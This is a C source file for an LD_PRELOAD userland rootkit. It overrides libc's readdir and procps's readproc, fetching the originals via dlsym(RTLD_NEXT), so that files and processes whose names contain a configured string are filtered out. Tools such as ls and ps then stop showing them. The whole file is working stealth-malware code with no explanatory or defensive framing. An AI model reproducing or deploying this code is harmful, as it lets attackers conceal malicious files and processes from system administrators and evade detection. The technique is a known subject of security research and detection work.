#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <proc/readproc.h>

#define FILENAME_TO_HIDE ("example")

#define FREEPROC(proc) do                                \
	               {                                 \
                           if (NULL != (proc))           \
			   {                             \
			       freeproc(proc);           \
		               (proc) = NULL;            \
			   }                             \
		       }                                 \
                       while (0)

typedef struct dirent* (*readdir_pfn_t)(DIR*);
typedef proc_t* (*readproc_pfn_t)(PROCTAB*, proc_t*);

static
readdir_pfn_t
g_original_readdir = NULL;

static
readproc_pfn_t
g_original_readproc = NULL;

struct
dirent*
readdir(DIR* dirp)
{
    struct dirent* ret = NULL;

    // Validate original function exists
    if (NULL == g_original_readdir)
    {
        g_original_readdir = dlsym(RTLD_NEXT, "readdir");
        if (NULL == g_original_readdir)
	{
            goto cleanup;
        }
    }

    // Invoke and skip directory entries to hide
    do
    {
        ret = g_original_readdir(dirp);
	if (NULL == ret)
	{
            goto cleanup;
	}
    }
    while (NULL != strstr(ret->d_name, FILENAME_TO_HIDE));

cleanup:

    // Return the entry
    return ret;
}

proc_t*
readproc(PROCTAB* PT, proc_t* return_buf)
{
    struct proc_t* ret = NULL;

    // Validate original function exists
    if (NULL == g_original_readproc)
    {
        g_original_readproc = dlsym(RTLD_NEXT, "readproc");
	if (NULL == g_original_readproc)
	{
            goto cleanup;
	}
    }

    // Invoke and skip process entries to hide
    do
    {
	// Free previously system-allocated buffers if required
        if (NULL == return_buf)
	{
            FREEPROC(ret);
	}

        ret = g_original_readproc(PT, return_buf);
        if (NULL == ret)
	{
            goto cleanup;
	}
    } while ((ret->cmdline[0] != NULL) && (NULL != strstr(ret->cmdline[0], FILENAME_TO_HIDE)));

cleanup:

    // Return the entry
    return ret;
}
